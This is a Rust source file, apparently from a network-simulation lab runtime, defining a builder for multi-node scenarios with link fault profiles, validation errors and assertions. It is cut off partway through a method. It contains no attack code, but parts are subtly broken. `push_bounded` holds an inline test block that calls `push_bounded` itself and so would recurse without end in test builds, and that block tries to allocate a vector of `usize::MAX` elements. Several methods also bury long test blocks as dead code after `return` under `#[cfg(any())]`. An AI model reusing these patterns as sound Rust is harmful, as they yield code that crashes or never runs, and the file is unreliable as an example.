// Builder API for defining multi-node lab scenarios with per-link fault
// profiles, deterministic seeding, and declarative assertions.
//
// Provides a fluent builder (`ScenarioBuilder`) that validates topology
// constraints (2-10 nodes, valid link endpoints, nonzero seed) and produces
// an immutable `Scenario` struct ready for execution by the lab runtime.
//
// bd-2ko — Section 10.11

use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet};
use std::fmt;

use super::virtual_transport::LinkFaultConfig;

// ---------------------------------------------------------------------------
// Schema version
// ---------------------------------------------------------------------------

/// Current schema version for scenario definitions.
pub const SCHEMA_VERSION: &str = "sb-v1.0";

// ---------------------------------------------------------------------------
// Event codes
// ---------------------------------------------------------------------------

/// Scenario builder created with initial parameters.
pub const EVT_SB_001: &str = "SB-001";
/// A virtual node was added to the scenario.
pub const EVT_SB_002: &str = "SB-002";
/// A virtual link was added between nodes.
pub const EVT_SB_003: &str = "SB-003";
/// A scenario assertion was registered.
pub const EVT_SB_004: &str = "SB-004";
/// Scenario successfully built and validated.
pub const EVT_SB_005: &str = "SB-005";

// ---------------------------------------------------------------------------
// Error codes
// ---------------------------------------------------------------------------

/// Scenario has fewer than the minimum required nodes.
pub const ERR_SB_TOO_FEW_NODES: &str = "ERR_SB_TOO_FEW_NODES";
/// Scenario has more than the maximum allowed nodes.
pub const ERR_SB_TOO_MANY_NODES: &str = "ERR_SB_TOO_MANY_NODES";
/// A link references a node that does not exist.
pub const ERR_SB_INVALID_LINK_ENDPOINT: &str = "ERR_SB_INVALID_LINK_ENDPOINT";
/// No seed was provided (seed must be nonzero).
pub const ERR_SB_NO_SEED: &str = "ERR_SB_NO_SEED";
/// Duplicate node name detected.
pub const ERR_SB_DUPLICATE_NODE: &str = "ERR_SB_DUPLICATE_NODE";
/// Duplicate link identifier detected.
pub const ERR_SB_DUPLICATE_LINK: &str = "ERR_SB_DUPLICATE_LINK";
/// Scenario name is empty.
pub const ERR_SB_EMPTY_NAME: &str = "ERR_SB_EMPTY_NAME";
/// Failed to serialize scenario JSON.
pub const ERR_SB_JSON_SERIALIZE: &str = "ERR_SB_JSON_SERIALIZE";
/// Failed to parse scenario JSON.
pub const ERR_SB_JSON_PARSE: &str = "ERR_SB_JSON_PARSE";
/// Scenario schema version is unsupported.
pub const ERR_SB_INVALID_SCHEMA_VERSION: &str = "ERR_SB_INVALID_SCHEMA_VERSION";
/// Fault profile references an unknown link.
pub const ERR_SB_UNKNOWN_FAULT_PROFILE_LINK: &str = "ERR_SB_UNKNOWN_FAULT_PROFILE_LINK";
/// Fault profile content is invalid.
pub const ERR_SB_INVALID_FAULT_PROFILE: &str = "ERR_SB_INVALID_FAULT_PROFILE";
/// Assertion references a node that does not exist in the scenario.
pub const ERR_SB_INVALID_ASSERTION_NODE: &str = "ERR_SB_INVALID_ASSERTION_NODE";

// ---------------------------------------------------------------------------
// Invariant constants
// ---------------------------------------------------------------------------

/// All link endpoints reference nodes that exist in the scenario.
pub const INV_SB_VALID_TOPOLOGY: &str = "INV-SB-VALID-TOPOLOGY";
/// Node count is within [MIN_NODES, MAX_NODES].
pub const INV_SB_NODE_BOUNDS: &str = "INV-SB-NODE-BOUNDS";
/// Seed is always nonzero for determinism.
pub const INV_SB_NONZERO_SEED: &str = "INV-SB-NONZERO-SEED";
/// Built scenarios are immutable and self-contained.
pub const INV_SB_IMMUTABLE: &str = "INV-SB-IMMUTABLE";

// ---------------------------------------------------------------------------
// Limits
// ---------------------------------------------------------------------------

/// Minimum number of virtual nodes in a scenario.
pub const MIN_NODES: usize = 2;
/// Maximum number of virtual nodes in a scenario.
pub const MAX_NODES: usize = 10;
/// Memory-safety capacity for the nodes Vec (must be > MAX_NODES to allow
/// the `build()` validation to detect over-limit and return TooManyNodes).
use crate::capacity_defaults::aliases::{MAX_ASSERTIONS, MAX_LINKS, MAX_NODES_CAP};

fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
    if cap == 0 {
        items.clear();
        return;
    }
    if items.len() >= cap {
        let overflow = items.len().saturating_sub(cap).saturating_add(1);
        items.drain(0..overflow.min(items.len()));
    }
    items.push(item);

    // Inline negative-path tests
    #[cfg(test)]
    {
        // Test: zero capacity clears vec before adding
        let mut test_vec = vec![1, 2, 3];
        push_bounded(&mut test_vec, 4, 0);
        assert!(test_vec.is_empty(), "zero cap should clear existing items");

        // Test: saturating arithmetic on overflow calculation
        let mut items_at_max = vec![0; usize::MAX];
        let large_cap = usize::MAX.saturating_sub(10);
        items_at_max.truncate(large_cap + 5); // Simulate near-overflow
        push_bounded(&mut items_at_max, 999, large_cap);
        // Should not panic due to saturating_sub/saturating_add
        assert!(items_at_max.len() <= large_cap.saturating_add(1));

        // Test: drain range bounds checking at capacity edge
        let mut edge_vec = vec![1, 2, 3, 4, 5];
        push_bounded(&mut edge_vec, 6, 3);
        assert_eq!(edge_vec.len(), 3, "should evict oldest when at capacity");
        assert_eq!(edge_vec[edge_vec.len() - 1], 6, "new item should be last");
    }
}

// ---------------------------------------------------------------------------
// NodeRole
// ---------------------------------------------------------------------------

/// Role a virtual node plays in the scenario topology.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum NodeRole {
    /// Drives consensus / orchestration decisions.
    Coordinator,
    /// Participates in the protocol actively.
    Participant,
    /// Watches the protocol without influencing it.
    Observer,
}

impl fmt::Display for NodeRole {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Coordinator => write!(f, "Coordinator"),
            Self::Participant => write!(f, "Participant"),
            Self::Observer => write!(f, "Observer"),
        }
    }
}

// ---------------------------------------------------------------------------
// VirtualNode
// ---------------------------------------------------------------------------

/// A virtual node in the scenario topology.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct VirtualNode {
    /// Unique node identifier (used as link endpoint reference).
    pub id: String,
    /// Human-readable node name.
    pub name: String,
    /// Role of this node in the scenario.
    pub role: NodeRole,
}

impl fmt::Display for VirtualNode {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "VirtualNode(id={}, name={}, role={})",
            self.id, self.name, self.role
        )
    }
}

// ---------------------------------------------------------------------------
// VirtualLink
// ---------------------------------------------------------------------------

/// A virtual network link between two nodes in the scenario topology.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct VirtualLink {
    /// Unique link identifier.
    pub id: String,
    /// Source node identifier.
    pub source_node: String,
    /// Target node identifier.
    pub target_node: String,
    /// Whether the link carries traffic in both directions.
    pub bidirectional: bool,
}

impl fmt::Display for VirtualLink {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let arrow = if self.bidirectional { "<->" } else { "->" };
        write!(
            f,
            "VirtualLink(id={}, {}{}{})",
            self.id, self.source_node, arrow, self.target_node
        )
    }
}

// ---------------------------------------------------------------------------
// ScenarioAssertion
// ---------------------------------------------------------------------------

/// Declarative assertions that are evaluated after scenario execution.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ScenarioAssertion {
    /// All nodes in the scenario reach a quiescent (idle) state.
    AllNodesReachQuiescence,
    /// A message is delivered from one node to another within a tick budget.
    MessageDelivered {
        from: String,
        to: String,
        within_ticks: u64,
    },
    /// A network partition is detected by the specified node within a tick budget.
    PartitionDetected { by_node: String, within_ticks: u64 },
    /// An epoch transition completes within a tick budget.
    EpochTransitionCompleted { epoch: u64, within_ticks: u64 },
    /// No deadlock is detected within a tick budget.
    NoDeadlock { within_ticks: u64 },
}

impl fmt::Display for ScenarioAssertion {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::AllNodesReachQuiescence => write!(f, "AllNodesReachQuiescence"),
            Self::MessageDelivered {
                from,
                to,
                within_ticks,
            } => write!(
                f,
                "MessageDelivered({from}->{to} within {within_ticks} ticks)"
            ),
            Self::PartitionDetected {
                by_node,
                within_ticks,
            } => write!(
                f,
                "PartitionDetected(by={by_node} within {within_ticks} ticks)"
            ),
            Self::EpochTransitionCompleted {
                epoch,
                within_ticks,
            } => write!(
                f,
                "EpochTransitionCompleted(epoch={epoch} within {within_ticks} ticks)"
            ),
            Self::NoDeadlock { within_ticks } => {
                write!(f, "NoDeadlock(within {within_ticks} ticks)")
            }
        }
    }
}

// ---------------------------------------------------------------------------
// ScenarioBuilderError
// ---------------------------------------------------------------------------

/// Errors that can occur during scenario construction and validation.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum ScenarioBuilderError {
    /// Fewer than MIN_NODES nodes were defined.
    TooFewNodes { count: usize, minimum: usize },
    /// More than MAX_NODES nodes were defined.
    TooManyNodes { count: usize, maximum: usize },
    /// A link endpoint references a node that does not exist.
    InvalidLinkEndpoint {
        link_id: String,
        missing_node: String,
    },
    /// Seed was zero or not set.
    NoSeed,
    /// A node with the same id was already added.
    DuplicateNode { node_id: String },
    /// A link with the same id was already added.
    DuplicateLink { link_id: String },
    /// Scenario name is empty.
    EmptyName,
    /// Failed to serialize scenario JSON output.
    JsonSerialize { message: String },
    /// Failed to parse JSON input.
    JsonParse { message: String },
    /// Scenario schema version is unsupported.
    InvalidSchemaVersion { found: String },
    /// Fault profile references an unknown link.
    UnknownFaultProfileLink { link_id: String },
    /// Fault profile content is invalid.
    InvalidFaultProfile { link_id: String, message: String },
    /// Assertion references a node that does not exist in the scenario.
    InvalidAssertionNode { assertion: String, node_id: String },
}

impl fmt::Display for ScenarioBuilderError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::TooFewNodes { count, minimum } => {
                write!(
                    f,
                    "{ERR_SB_TOO_FEW_NODES}: {count} nodes defined, minimum is {minimum}"
                )
            }
            Self::TooManyNodes { count, maximum } => {
                write!(
                    f,
                    "{ERR_SB_TOO_MANY_NODES}: {count} nodes defined, maximum is {maximum}"
                )
            }
            Self::InvalidLinkEndpoint {
                link_id,
                missing_node,
            } => {
                write!(
                    f,
                    "{ERR_SB_INVALID_LINK_ENDPOINT}: link '{link_id}' references unknown node '{missing_node}'"
                )
            }
            Self::NoSeed => write!(f, "{ERR_SB_NO_SEED}: seed must be nonzero"),
            Self::DuplicateNode { node_id } => {
                write!(
                    f,
                    "{ERR_SB_DUPLICATE_NODE}: node '{node_id}' already exists"
                )
            }
            Self::DuplicateLink { link_id } => {
                write!(
                    f,
                    "{ERR_SB_DUPLICATE_LINK}: link '{link_id}' already exists"
                )
            }
            Self::EmptyName => write!(f, "{ERR_SB_EMPTY_NAME}: scenario name must not be empty"),
            Self::JsonSerialize { message } => {
                write!(
                    f,
                    "{ERR_SB_JSON_SERIALIZE}: failed to serialize scenario JSON: {message}"
                )
            }
            Self::JsonParse { message } => {
                write!(
                    f,
                    "{ERR_SB_JSON_PARSE}: failed to parse scenario JSON: {message}"
                )
            }
            Self::InvalidSchemaVersion { found } => {
                write!(
                    f,
                    "{ERR_SB_INVALID_SCHEMA_VERSION}: unsupported schema_version={found}, expected={SCHEMA_VERSION}"
                )
            }
            Self::UnknownFaultProfileLink { link_id } => {
                write!(
                    f,
                    "{ERR_SB_UNKNOWN_FAULT_PROFILE_LINK}: fault profile references unknown link '{link_id}'"
                )
            }
            Self::InvalidFaultProfile { link_id, message } => {
                write!(
                    f,
                    "{ERR_SB_INVALID_FAULT_PROFILE}: link '{link_id}' has invalid fault profile: {message}"
                )
            }
            Self::InvalidAssertionNode { assertion, node_id } => {
                write!(
                    f,
                    "{ERR_SB_INVALID_ASSERTION_NODE}: assertion '{assertion}' references unknown node '{node_id}'"
                )
            }
        }
    }
}

impl std::error::Error for ScenarioBuilderError {}

// ---------------------------------------------------------------------------
// Scenario
// ---------------------------------------------------------------------------

/// An immutable, validated multi-node lab scenario ready for execution.
///
/// # Invariants
///
/// - INV-SB-VALID-TOPOLOGY: all link endpoints reference existing nodes.
/// - INV-SB-NODE-BOUNDS: node count in [MIN_NODES, MAX_NODES].
/// - INV-SB-NONZERO-SEED: seed is always nonzero.
/// - INV-SB-IMMUTABLE: once built, the scenario cannot be modified.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Scenario {
    /// Schema version tag.
    pub schema_version: String,
    /// Human-readable scenario name.
    pub name: String,
    /// Optional description of the scenario.
    pub description: String,
    /// Deterministic seed for the scenario execution.
    pub seed: u64,
    /// Virtual nodes that participate in the scenario.
    pub nodes: Vec<VirtualNode>,
    /// Virtual links connecting the nodes.
    pub links: Vec<VirtualLink>,
    /// Per-link fault injection profiles, keyed by link id.
    pub fault_profiles: BTreeMap<String, LinkFaultConfig>,
    /// Declarative assertions evaluated after execution.
    pub assertions: Vec<ScenarioAssertion>,
}

impl Scenario {
    fn validate(&self) -> Result<(), ScenarioBuilderError> {
        if self.schema_version != SCHEMA_VERSION {
            return Err(ScenarioBuilderError::InvalidSchemaVersion {
                found: self.schema_version.clone(),
            });
        }
        if self.name.is_empty() {
            return Err(ScenarioBuilderError::EmptyName);
        }
        if self.seed == 0 {
            return Err(ScenarioBuilderError::NoSeed);
        }
        if self.nodes.len() < MIN_NODES {
            return Err(ScenarioBuilderError::TooFewNodes {
                count: self.nodes.len(),
                minimum: MIN_NODES,
            });
        }
        if self.nodes.len() > MAX_NODES {
            return Err(ScenarioBuilderError::TooManyNodes {
                count: self.nodes.len(),
                maximum: MAX_NODES,
            });
        }

        let mut node_ids = BTreeSet::new();
        for node in &self.nodes {
            if !node_ids.insert(node.id.clone()) {
                return Err(ScenarioBuilderError::DuplicateNode {
                    node_id: node.id.clone(),
                });
            }
        }

        let mut link_ids = BTreeSet::new();
        for link in &self.links {
            if !link_ids.insert(link.id.clone()) {
                return Err(ScenarioBuilderError::DuplicateLink {
                    link_id: link.id.clone(),
                });
            }
            if !node_ids.contains(&link.source_node) {
                return Err(ScenarioBuilderError::InvalidLinkEndpoint {
                    link_id: link.id.clone(),
                    missing_node: link.source_node.clone(),
                });
            }
            if !node_ids.contains(&link.target_node) {
                return Err(ScenarioBuilderError::InvalidLinkEndpoint {
                    link_id: link.id.clone(),
                    missing_node: link.target_node.clone(),
                });
            }
        }

        for (link_id, config) in &self.fault_profiles {
            if !link_ids.contains(link_id) {
                return Err(ScenarioBuilderError::UnknownFaultProfileLink {
                    link_id: link_id.clone(),
                });
            }
            config
                .validate()
                .map_err(|err| ScenarioBuilderError::InvalidFaultProfile {
                    link_id: link_id.clone(),
                    message: err.to_string(),
                })?;
        }

        for assertion in &self.assertions {
            match assertion {
                ScenarioAssertion::AllNodesReachQuiescence
                | ScenarioAssertion::EpochTransitionCompleted { .. }
                | ScenarioAssertion::NoDeadlock { .. } => {}
                ScenarioAssertion::MessageDelivered { from, to, .. } => {
                    if !node_ids.contains(from) {
                        return Err(ScenarioBuilderError::InvalidAssertionNode {
                            assertion: "MessageDelivered.from".to_string(),
                            node_id: from.clone(),
                        });
                    }
                    if !node_ids.contains(to) {
                        return Err(ScenarioBuilderError::InvalidAssertionNode {
                            assertion: "MessageDelivered.to".to_string(),
                            node_id: to.clone(),
                        });
                    }
                }
                ScenarioAssertion::PartitionDetected { by_node, .. } => {
                    if !node_ids.contains(by_node) {
                        return Err(ScenarioBuilderError::InvalidAssertionNode {
                            assertion: "PartitionDetected.by_node".to_string(),
                            node_id: by_node.clone(),
                        });
                    }
                }
            }
        }

        return Ok(());

        // Inline negative-path tests
        #[cfg(any())]
        #[allow(unreachable_code)]
        {
            // Test: schema version boundary condition with empty string
            let invalid_schema = Scenario {
                schema_version: "".to_string(),
                name: "test".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert!(
                invalid_schema.validate().is_err(),
                "empty schema version should fail"
            );

            // Test: node count exactly at MIN_NODES boundary
            let min_boundary = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "min-test".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![VirtualNode {
                    id: "only".to_string(),
                    name: "Only Node".to_string(),
                    role: NodeRole::Coordinator,
                }],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert!(
                min_boundary.validate().is_err(),
                "below MIN_NODES should fail"
            );

            // Test: self-referencing link (source == target)
            let self_loop = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "self-loop".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![VirtualLink {
                    id: "self".to_string(),
                    source_node: "n1".to_string(),
                    target_node: "n1".to_string(),
                    bidirectional: false,
                }],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            // Self-loops should be allowed (not an error condition)
            assert!(self_loop.validate().is_ok(), "self-loops should be valid");
        }
    }

    /// Return the number of nodes.
    pub fn node_count(&self) -> usize {
        return self.nodes.len();

        // Inline negative-path tests
        #[cfg(any())]
        #[allow(unreachable_code)]
        {
            // Test: empty scenario has zero node count
            let empty_scenario = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "empty".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                empty_scenario.node_count(),
                0,
                "empty scenario should have 0 nodes"
            );

            // Test: single node scenario
            let single_node = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "single".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![VirtualNode {
                    id: "only".to_string(),
                    name: "Only Node".to_string(),
                    role: NodeRole::Observer,
                }],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                single_node.node_count(),
                1,
                "single node scenario should have 1 node"
            );

            // Test: maximum allowed nodes
            let mut max_nodes = Vec::new();
            for i in 0..MAX_NODES {
                max_nodes.push(VirtualNode {
                    id: format!("node_{}", i),
                    name: format!("Node {}", i),
                    role: NodeRole::Participant,
                });
            }
            let max_scenario = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "max".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: max_nodes,
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                max_scenario.node_count(),
                MAX_NODES,
                "max scenario should have MAX_NODES nodes"
            );

            // Test: node count consistency with vector length
            let test_scenario = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "consistency".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                    VirtualNode {
                        id: "n3".to_string(),
                        name: "Node 3".to_string(),
                        role: NodeRole::Observer,
                    },
                ],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                test_scenario.node_count(),
                test_scenario.nodes.len(),
                "node_count should match nodes.len()"
            );

            // Test: boundary at MIN_NODES - 1
            let below_min = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "below_min".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![VirtualNode {
                    id: "insufficient".to_string(),
                    name: "Insufficient".to_string(),
                    role: NodeRole::Coordinator,
                }],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                below_min.node_count(),
                MIN_NODES - 1,
                "below min should have MIN_NODES - 1"
            );

            // Test: node count with duplicate IDs (structural test)
            let dup_ids = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "dup_ids".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "same".to_string(),
                        name: "First".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "same".to_string(),
                        name: "Second".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                dup_ids.node_count(),
                2,
                "node count should include duplicates structurally"
            );

            // Test: node count deterministic across multiple calls
            let stable_scenario = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "stable".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "stable1".to_string(),
                        name: "Stable 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "stable2".to_string(),
                        name: "Stable 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            for _ in 0..5 {
                assert_eq!(
                    stable_scenario.node_count(),
                    2,
                    "node count should be deterministic"
                );
            }
        }
    }

    /// Return the number of links.
    pub fn link_count(&self) -> usize {
        return self.links.len();

        // Inline negative-path tests
        #[cfg(any())]
        #[allow(unreachable_code)]
        {
            // Test: scenario with no links
            let no_links = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "isolated".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                no_links.link_count(),
                0,
                "scenario with no links should have count 0"
            );

            // Test: single link scenario
            let single_link = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "single_link".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![VirtualLink {
                    id: "link1".to_string(),
                    source_node: "n1".to_string(),
                    target_node: "n2".to_string(),
                    bidirectional: false,
                }],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                single_link.link_count(),
                1,
                "single link scenario should have count 1"
            );

            // Test: fully connected graph (all possible links between nodes)
            let full_mesh = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "full_mesh".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "a".to_string(),
                        name: "Node A".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "b".to_string(),
                        name: "Node B".to_string(),
                        role: NodeRole::Participant,
                    },
                    VirtualNode {
                        id: "c".to_string(),
                        name: "Node C".to_string(),
                        role: NodeRole::Observer,
                    },
                ],
                links: vec![
                    VirtualLink {
                        id: "ab".to_string(),
                        source_node: "a".to_string(),
                        target_node: "b".to_string(),
                        bidirectional: false,
                    },
                    VirtualLink {
                        id: "ac".to_string(),
                        source_node: "a".to_string(),
                        target_node: "c".to_string(),
                        bidirectional: false,
                    },
                    VirtualLink {
                        id: "ba".to_string(),
                        source_node: "b".to_string(),
                        target_node: "a".to_string(),
                        bidirectional: false,
                    },
                    VirtualLink {
                        id: "bc".to_string(),
                        source_node: "b".to_string(),
                        target_node: "c".to_string(),
                        bidirectional: false,
                    },
                    VirtualLink {
                        id: "ca".to_string(),
                        source_node: "c".to_string(),
                        target_node: "a".to_string(),
                        bidirectional: false,
                    },
                    VirtualLink {
                        id: "cb".to_string(),
                        source_node: "c".to_string(),
                        target_node: "b".to_string(),
                        bidirectional: false,
                    },
                ],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                full_mesh.link_count(),
                6,
                "full mesh of 3 nodes should have 6 directed links"
            );

            // Test: self-loops count as links
            let with_self_loops = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "self_loops".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![
                    VirtualLink {
                        id: "n1_self".to_string(),
                        source_node: "n1".to_string(),
                        target_node: "n1".to_string(),
                        bidirectional: true,
                    },
                    VirtualLink {
                        id: "n2_self".to_string(),
                        source_node: "n2".to_string(),
                        target_node: "n2".to_string(),
                        bidirectional: false,
                    },
                    VirtualLink {
                        id: "n1_n2".to_string(),
                        source_node: "n1".to_string(),
                        target_node: "n2".to_string(),
                        bidirectional: true,
                    },
                ],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                with_self_loops.link_count(),
                3,
                "self-loops should be counted as links"
            );

            // Test: duplicate link IDs (structural count)
            let dup_link_ids = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "dup_links".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![
                    VirtualLink {
                        id: "same".to_string(),
                        source_node: "n1".to_string(),
                        target_node: "n2".to_string(),
                        bidirectional: false,
                    },
                    VirtualLink {
                        id: "same".to_string(),
                        source_node: "n2".to_string(),
                        target_node: "n1".to_string(),
                        bidirectional: false,
                    },
                ],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                dup_link_ids.link_count(),
                2,
                "duplicate link IDs should still count structurally"
            );

            // Test: links with invalid endpoints (structural count)
            let invalid_endpoints = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "invalid_endpoints".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![VirtualNode {
                    id: "n1".to_string(),
                    name: "Node 1".to_string(),
                    role: NodeRole::Coordinator,
                }],
                links: vec![VirtualLink {
                    id: "invalid".to_string(),
                    source_node: "n1".to_string(),
                    target_node: "missing".to_string(),
                    bidirectional: false,
                }],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                invalid_endpoints.link_count(),
                1,
                "invalid endpoints should still count structurally"
            );

            // Test: bidirectional vs unidirectional doesn't affect count
            let mixed_directions = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "mixed_directions".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                    VirtualNode {
                        id: "n3".to_string(),
                        name: "Node 3".to_string(),
                        role: NodeRole::Observer,
                    },
                ],
                links: vec![
                    VirtualLink {
                        id: "uni".to_string(),
                        source_node: "n1".to_string(),
                        target_node: "n2".to_string(),
                        bidirectional: false,
                    },
                    VirtualLink {
                        id: "bi".to_string(),
                        source_node: "n2".to_string(),
                        target_node: "n3".to_string(),
                        bidirectional: true,
                    },
                ],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                mixed_directions.link_count(),
                2,
                "bidirectional flag doesn't affect link count"
            );

            // Test: link count consistency with vector length
            let consistency_test = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "consistency".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![
                    VirtualLink {
                        id: "l1".to_string(),
                        source_node: "n1".to_string(),
                        target_node: "n2".to_string(),
                        bidirectional: false,
                    },
                    VirtualLink {
                        id: "l2".to_string(),
                        source_node: "n2".to_string(),
                        target_node: "n1".to_string(),
                        bidirectional: true,
                    },
                ],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                consistency_test.link_count(),
                consistency_test.links.len(),
                "link_count should match links.len()"
            );

            // Test: deterministic behavior across multiple calls
            let stable_links = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "stable".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![VirtualLink {
                    id: "stable_link".to_string(),
                    source_node: "n1".to_string(),
                    target_node: "n2".to_string(),
                    bidirectional: false,
                }],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            for _ in 0..5 {
                assert_eq!(
                    stable_links.link_count(),
                    1,
                    "link count should be deterministic"
                );
            }
        }
    }

    /// Return the number of assertions.
    pub fn assertion_count(&self) -> usize {
        return self.assertions.len();

